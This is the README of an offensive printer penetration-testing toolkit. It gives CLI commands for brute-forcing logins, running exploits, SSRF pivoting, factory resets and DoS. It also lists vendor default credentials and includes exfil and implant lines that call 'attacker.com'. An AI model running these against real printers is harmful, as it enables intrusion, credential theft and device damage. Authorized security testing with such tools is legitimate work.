# PrinterReaper v3.7.0

> **Advanced Printer Penetration Testing Toolkit**
> Discover. Fingerprint. Exploit. Pivot. Report.

PrinterReaper is a complete, modular framework for security assessment of network printers — covering all major printer languages (PJL, PostScript, PCL, ESC/P), all common network protocols (RAW, IPP, LPD, SMB, HTTP, SNMP, FTP, Telnet), 39+ exploit modules, an external wordlist-driven credential engine, ML-assisted fingerprinting, CVE/NVD integration, and automated lateral movement mapping.

> Built and maintained by **[@mrhenrike](https://github.com/mrhenrike)** — [LinkedIn](https://linkedin.com/in/mrhenrike) · [X/Twitter](https://x.com/mrhenrike)

---

## Architecture — What Can Be Exploited

![Printer Attack Surface](img/printer_architecture.svg)

A network printer exposes multiple attack surfaces simultaneously: **print channels** (RAW 9100, IPP 631, LPD 515) accept raw printer language commands; **management channels** (HTTP/EWS 80, SMB 445) expose administrative interfaces; **high-risk services** (SNMP 161, FTP 21, Telnet 23) often run with default credentials or misconfigured access controls. PrinterReaper targets all of them.

---

## Operational Workflow

![PrinterReaper Workflow](img/printerreaper_workflow.svg)

| Phase | What happens | Key flags |
|-------|-------------|-----------|
| **Discover** | SNMP sweep, local enumeration, Shodan/Censys, WSD | `--discover-local` `--discover-online` |
| **Fingerprint** | Banner grab (HTTP/IPP/SNMP/PJL/LPD/WSD), ML model | `--scan` `--scan-ml` |
| **Assess** | CVE/NVD lookup, exploit matching, attack surface score | `--scan --no-nvd` |
| **Exploit** | PJL/PS/PCL commands, brute-force login, exploit modules | `pjl` `ps` `pcl` `--bruteforce` `--xpl-run` |
| **Pivot** | SSRF via IPP/WSD, network map, LDAP hash capture | `--pivot` `--network-map` |
| **Report** | Terminal log, handoff.md, CVE list, found credentials | `.log/terminal-output.log` |

---

## Attack Coverage

![Attack Coverage Matrix](img/attack_coverage_matrix.svg)

All attack categories from the **Müller et al. BlackHat USA 2017** printer exploitation research are implemented, plus additional post-2020 CVEs and new attack classes:

| Category | Technique | Protocol | Source |
|----------|-----------|----------|--------|
| DoS | PS infinite loop `{} loop` | PostScript/RAW | Müller 2017 |
| DoS | showpage redefinition | PostScript/exitserver | Müller 2017 |
| DoS | Offline mode | PJL | Müller 2017 |
| DoS | Physical NVRAM damage (`@PJL DEFAULT COPIES=X`) | PJL | Müller 2017 |
| DoS | FORMLINES crash | PJL | CVE-2024-51982 |
| DoS | IPP queue purge | IPP | RFC 8011 |
| ProtBypass | Password disclosure via `PJL INFO VARIABLES` | PJL | Müller 2017 |
| ProtBypass | Factory reset via `@PJL DMCMD ASCIIHEX=...` | PML | Müller 2017 |
| ProtBypass | exitserver operator unlock | PostScript | Müller 2017 |
| ProtBypass | SNMP SET factory reset | SNMP | Generic |
| JobManip | Page overlay (watermark/stamp injection) | PostScript | Advisory 1/6 |
| JobManip | Print job capture + retention | PostScript/exitserver | Advisory 1/6 |
| JobManip | Captured job enumeration | PostScript/capturedict | Advisory 1/6 |
| InfoDisc | PJL memory dump (`@PJL DMINFO`) | PJL | Müller 2017 |
| InfoDisc | Filesystem listing (`filenameforall`) | PostScript | Müller 2017 |
| InfoDisc | Credential file extraction | PS/PJL path traversal | Müller 2017 |
| InfoDisc | Cross-Site Printing + CORS spoofing | PostScript + HTTP | XSP research |
| InfoDisc | SNMP MIB walk (2000+ OIDs) | SNMP | Generic |
| CredAttack | HTTP/HTTPS brute-force (form+BasicAuth+Digest) | HTTP | PrinterReaper |
| CredAttack | FTP default credentials | FTP | PrinterReaper |
| CredAttack | SNMP community string enumeration | SNMP | PrinterReaper |
| CredAttack | Telnet login brute-force | Telnet | PrinterReaper |
| Lateral | SSRF via IPP Print-URI / WSD SOAP | IPP/WSD | PrinterReaper |
| Lateral | LDAP/AD NTLM hash capture via rogue server | HTTP/LDAP | Research module |
| Lateral | Network map: routing table, ARP cache, subnet scan | SNMP/PJL | PrinterReaper |

---

## Credential Architecture (v3.7.0)

![Credential Wordlist Flow](img/credential_wordlist_flow.svg)

**Zero hardcoded credentials** — all credential data lives in external wordlist files under `wordlists/`:

```
wordlists/
  printer_default_creds.txt   # 195+ user:pass, sections by vendor
  snmp_communities.txt        # SNMP community strings
  ftp_creds.txt               # FTP credentials for printer file servers
  pjl_passwords.txt           # PJL protection bypass passwords
```

### Wordlist format — vendor sections

```
# ── HP (Hewlett-Packard) ─────────────────────────────────────────────────────
Admin:Admin
jetdirect:
admin:hpinvent!

# ── Epson ─────────────────────────────────────────────────────────────────────
admin:epson
admin:__SERIAL__
```

Token entries are expanded at runtime:
- `__SERIAL__` → replaced with `--bf-serial` value (e.g. `XAABT77481`)
- `__MAC6__` → last 6 hex chars of MAC (used by OKI, Brother, Kyocera)
- `__MAC12__` → full 12-char MAC without separators

### Brute-force usage

```bash
# Use default wordlist (wordlists/printer_default_creds.txt)
python src/main.py 192.168.1.100 --bruteforce --bf-vendor epson --bf-serial XAABT77481

# Use a custom wordlist instead of the default
python src/main.py 192.168.1.100 --bruteforce --bf-wordlist /path/to/my_creds.txt

# Add individual credentials on top of the wordlist
python src/main.py 192.168.1.100 --bruteforce --bf-cred admin:MyPass --bf-cred root:

# Disable variation engine (faster — no leet/reverse/camelcase mutations)
python src/main.py 192.168.1.100 --bruteforce --bf-no-variations

# With vendor auto-detection and serial number
python src/main.py 192.168.1.100 --scan --bruteforce --bf-serial XAABT77481
```

Password variations generated per base password: `normal`, `reverse`, `leet` (a→@ e→3 i→1 o→0 s→$ t→7), `CamelCase`, `UPPER`, `lower`, `reverse+leet`, `base+1`, `base+!`, `1+base`.

---

## Quick Start

```bash
# Clone
git clone https://github.com/mrhenrike/PrinterReaper.git
cd PrinterReaper

# Create virtual environment (recommended — avoids EDR conflicts with temp dirs)
python -m venv .venv
.venv\Scripts\activate        # Windows
source .venv/bin/activate     # Linux / macOS

# Install dependencies
pip install -r requirements.txt

# Verify
python src/main.py --version
```

### Discover printers

```bash
# Local network SNMP discovery
python src/main.py --discover-local

# Online discovery (requires Shodan/Censys API key in config.json)
python src/main.py --discover-online
```

### Scan a target

```bash
# Passive recon — no payloads sent
python src/main.py 192.168.1.100 --scan

# With ML-assisted attack scoring
python src/main.py 192.168.1.100 --scan-ml

# Offline mode (no NVD API call)
python src/main.py 192.168.1.100 --scan --no-nvd
```

### Interactive shell

```bash
# Auto-detect best printer language
python src/main.py 192.168.1.100 auto

# Specific language
python src/main.py 192.168.1.100 pjl    # PJL — filesystem, NVRAM, job control
python src/main.py 192.168.1.100 ps     # PostScript — Turing-complete, overlays
python src/main.py 192.168.1.100 pcl    # PCL — legacy, macro filesystem
```

---

## Exploit Library

```bash
# List all available exploits (sorted by CVSS severity)
python src/main.py 192.168.1.100 --xpl-list

# Check if target is vulnerable (non-destructive probe)
python src/main.py 192.168.1.100 --xpl-check edb-35151

# Run exploit in dry-run mode (default — safe)
python src/main.py 192.168.1.100 --xpl-run edb-35151

# Live exploitation (AUTHORIZED LABS ONLY)
python src/main.py 192.168.1.100 --xpl-run edb-35151 --no-dry

# Download a new exploit from ExploitDB into xpl/
python src/main.py --xpl-fetch 47850
```

The `xpl/` directory structure:
```
xpl/
  edb-15631/          # HP PJL directory traversal (EDB-15631)
  edb-17636/          # Xerox FTP default creds (EDB-17636)
  edb-35151/          # HP LaserJet remote disclosure (EDB-35151)
  edb-45273/          # Ricoh Web Image Monitor auth bypass (EDB-45273)
  msf-pjl-traversal/  # Metasploit: PJL filesystem traversal
  msf-hp-ews-auth/    # Metasploit: HP EWS authentication bypass
  research-ldap-hash-capture/  # NTLM hash capture via rogue LDAP
  edb-cve-2024-51978/ # Brother WBM default password exposure
  custom/             # Drop your own exploit.py + metadata.json here
  index.json          # Auto-generated exploit index
```

Each exploit module exports:
```python
def check(host, port, **kwargs) -> bool:  # non-destructive probe
def run(host, port, **kwargs) -> dict:    # full execution (respects dry_run flag)
```

---

## Full Attack Matrix Campaign

```bash
# Run all attack categories (dry-run — probe only)
python src/main.py 192.168.1.100 --attack-matrix

# Live exploitation (AUTHORIZED LABS ONLY — irreversible actions)
python src/main.py 192.168.1.100 --attack-matrix --no-dry

# Attack matrix + network mapping in one pass
python src/main.py 192.168.1.100 --attack-matrix --network-map
```

---

## Network Mapping & Lateral Movement

```bash
# Full network map from printer's perspective
python src/main.py 192.168.1.100 --network-map

# SSRF pivot — use printer to reach internal hosts
python src/main.py 192.168.1.100 --pivot

# Port-scan an internal host via printer SSRF
python src/main.py 192.168.1.100 --pivot-scan 10.0.0.1
```

Output includes:
- SNMP routing table, ARP cache, interface list
- PJL network variables (IP, gateway, DNS, WINS, NTP)
- Web config page scraping (IPs, MACs, gateway)
- Full /24 subnet scan (60 threads, 18 key ports)
- WSD device discovery
- Attack paths per discovered host

---

## Cross-Site Printing (XSP) + CORS Spoofing

```bash
# Generate XSP payload — printer info disclosure via victim browser
python src/main.py 192.168.1.100 --xsp info

# Generate print job capture payload
python src/main.py 192.168.1.100 --xsp capture

# Generate DoS payload for web attacker model
python src/main.py 192.168.1.100 --xsp dos

# With exfil callback
python src/main.py 192.168.1.100 --xsp exfil --xsp-callback https://attacker.com/recv
```

XSP payloads create HTML+JavaScript files that use `XMLHttpRequest` to send PostScript to port 9100 via the victim's browser, bypassing the same-origin policy using CORS spoofing techniques.

---

## Storage & Firmware

```bash
# Printer storage audit: FTP, web file manager, SNMP MIB dump, saved jobs
python src/main.py 192.168.1.100 --storage

# Firmware audit: version extraction, upload endpoint check, NVRAM probe
python src/main.py 192.168.1.100 --firmware

# Attempt factory reset (DANGEROUS — authorized labs only)
python src/main.py 192.168.1.100 --firmware-reset pjl

# Persistent config implant (set SMTP/DNS/SNMP via web or PJL)
python src/main.py 192.168.1.100 --implant smtp_host=attacker.com
```

---

## Send Print Job

```bash
# Send a document to print on the target printer
python src/main.py 192.168.1.100 --send-job report.pdf
python src/main.py 192.168.1.100 --send-job document.txt
python src/main.py 192.168.1.100 --send-job image.jpg

# Override port and protocol
python src/main.py 192.168.1.100 --send-job report.pdf --port 9100
```

Supported formats: `.ps`, `.pcl`, `.pdf`, `.txt`, `.png`, `.jpg`, `.doc`, `.docx`, and any raw format.

---

## Interactive Shell Commands

Once connected (`python src/main.py <IP> pjl`), you have access to 109 commands:

### Filesystem (PJL + PS)
```
ls, mkdir, find, upload, download, delete, copy, move, touch
chmod, permissions, rmdir, mirror, get, put, cat, edit, append, fuzz
```

### Information
```
id, version, devices, uptime, date, pagecount, variables, printenv
network, info, scan_volumes, firmware_info, dicts, dump, known, search
```

### Control
```
set, display, offline, restart, reset, selftest, backup, restore
config, formfeed, copies, open, close, timeout, reconnect
```

### Attacks
```
destroy, flood, hold, format, capture, overlay, cross, replace
hang, payload, traverse, dos_display, dos_jobs, dos_connections, exfiltrate, backdoor
```

---

## Module Comparison

| Feature | PJL | PostScript | PCL |
|---------|-----|------------|-----|
| Commands | 54 | 40 | 15 |
| Filesystem access | Full | Full | Virtual |
| Path traversal | Yes | Yes | No |
| NVRAM read/write | Yes | No | No |
| Job capture | Yes | Yes | No |
| Page overlays | No | Yes | No |
| Text replacement | No | Yes | No |
| Lock/Unlock | Yes | Yes | No |
| Best for | HP, Brother, Ricoh | Advanced attacks | Legacy devices |

---

## Configuration (API Keys)

Copy `config.json.example` to `config.json` and fill in your API keys:

```json
{
  "shodan":  { "api_key": "YOUR_SHODAN_KEY" },
  "censys":  { "api_id": "",  "api_secret": "" },
  "nvd":     { "api_key": "YOUR_NVD_KEY" },
  "ml":      { "enabled": true }
}
```

Check which features are available:
```bash
python src/main.py --check-config
```

---

## Supported Vendors

20+ vendors with dedicated wordlist sections and exploit modules:

| Vendor | Default Creds | Exploits | Notes |
|--------|--------------|---------|-------|
| HP | admin:(blank), Admin:Admin, jetdirect: | EDB-15631, EDB-35151, MSF-HP-EWS | Serial number in newer models |
| Epson | admin:epson, admin:\<serial\> | SNMP, IPP, HTTP | L3250 validated in lab |
| Brother | admin:initpass, admin:access | CVE-2024-51978 (SNMP OID) | WBM password via SNMP |
| Ricoh | admin:(blank), supervisor:(blank) | EDB-45273 | supervisor is undocumented backdoor |
| Xerox | admin:1111, admin:admin | EDB-17636 | FTP default creds |
| Canon | admin:(blank), ADMIN:canon | CVE-2023-27516, CVE-2019-14308 | Session fixation |
| Kyocera | Admin:Admin, admin:admin | MSF-Kyocera-FS | KR2 uses MAC as password |
| Samsung | admin:sec00000, admin:1234 | MSF-Samsung-6600 | SyncThru web service |
| OKI | admin:aaaaaa, admin:\<mac6\> | PJL-based | Last 6 of MAC address |
| Lexmark | admin:1234, admin:password | EDB-20565 | HTTP auth bypass |
| Konica Minolta | admin:(blank), 12345678:12345678 | IPP, SNMP | bizhub series |
| Fujifilm | x-admin:11111, admin:admin | Custom | Printix Go integration |
| Zebra | admin:1234, admin:admin | HTTP, SNMP | ZD421/ZD621 series |
| Axis | root:pass, admin:admin | Custom | Print server |

---

## Version History

| Version | Date | Highlights |
|---------|------|------------|
| **3.7.0** | 2026-03-25 | Wordlist-driven creds (no hardcode), `wordlist_loader.py`, `--bf-wordlist` replaces default, validated on Epson L3250 + 7 emulated printers |
| 3.6.2 | 2026-03-25 | LDAP hash capture module, CVE-2024-51978 (Brother), Fujifilm/Axis/Zebra/IBM/Minolta creds |
| 3.6.1 | 2026-03-24 | Expanded creds DB: Ricoh supervisor backdoor, Canon ADMIN/canon, Xerox 22222/2222 |
| 3.6.0 | 2026-03-24 | 7 new BlackHat 2017 exploit modules + EDB-2024 research modules |
| 3.5.0 | 2026-03-24 | `--send-job` (any file format), `wordlists/` subfolder, emoji-free CLI |
| 3.4.2 | 2026-03-24 | Interactive guided menu, spinner, section headers, next-steps hints |
| 3.4.1 | 2026-03-24 | Default credentials DB (14 vendors), login brute-force engine, variation generator |
| 3.4.0 | 2026-03-24 | Exploit library (`xpl/`), `--xpl-list/check/run/fetch`, exploit auto-matching on scan |
| 3.3.0 | 2026-03-24 | `--attack-matrix`, `--network-map`, XSP/CORS spoofing, NVD API integration |
| 3.2.0 | 2026-03-24 | IPP attack suite, SSRF pivot, storage access, firmware audit, persistent implants |
| 3.1.0 | 2026-03-24 | `--scan/--scan-ml`, CVE scanner, ML fingerprint engine, config.yaml, Shodan |
| 3.0.0 | 2026-03-24 | IPv6, SMB complete, pysnmp v5/v7, IPP/TLS fallback, local discovery, 63 QA tests |
| 2.5.x | 2025-10-05 | Cross-platform (Windows/Linux/macOS/Android), PRET assets, overlay commands |

---

## Installation

### Requirements

- Python 3.8+
- Windows, Linux, macOS, or BSD (Android/Termux: limited support)

### Full install

```bash
git clone https://github.com/mrhenrike/PrinterReaper.git
cd PrinterReaper

# Recommended: virtual environment
python -m venv .venv
.venv\Scripts\activate     # Windows PowerShell
source .venv/bin/activate  # Linux / macOS

pip install -r requirements.txt
```

### Optional tools

```bash
# SNMP discovery (Ubuntu/Debian)
sudo apt install snmp snmp-mibs-downloader

# SNMP discovery (macOS)
brew install net-snmp
```

### Dependencies

```
requests>=2.31.0        HTTP client
urllib3>=2.0.0          HTTP helpers
pysnmp>=4.4.12          SNMP v1/v2c/v3
pysmb>=1.2.9            SMB printing
shodan>=1.31.0          Shodan API
censys>=2.2.6           Censys API
scikit-learn>=1.4.0     ML fingerprinting (optional)
colorama>=0.4.6         Terminal colors
```

---

## Legal Disclaimer

PrinterReaper is developed for **authorized security research, penetration testing, and educational purposes only**.

Using this tool against systems you do not own or have explicit written permission to test is **illegal** and unethical. The author assumes no liability for misuse or damage.

Always obtain proper authorization before testing any device.

---

## Author

**Andre Henrique** — [@mrhenrike](https://github.com/mrhenrike)
[LinkedIn](https://linkedin.com/in/mrhenrike) · [X/Twitter](https://x.com/mrhenrike)

References:
- Müller, J. et al. — *Exploiting Network Printers*, BlackHat USA 2017
- [Hacking Printers Wiki](http://hacking-printers.net)
- [ExploitDB Printer Exploits](https://www.exploit-db.com/search?q=printer)
- [NVD — National Vulnerability Database](https://nvd.nist.gov)
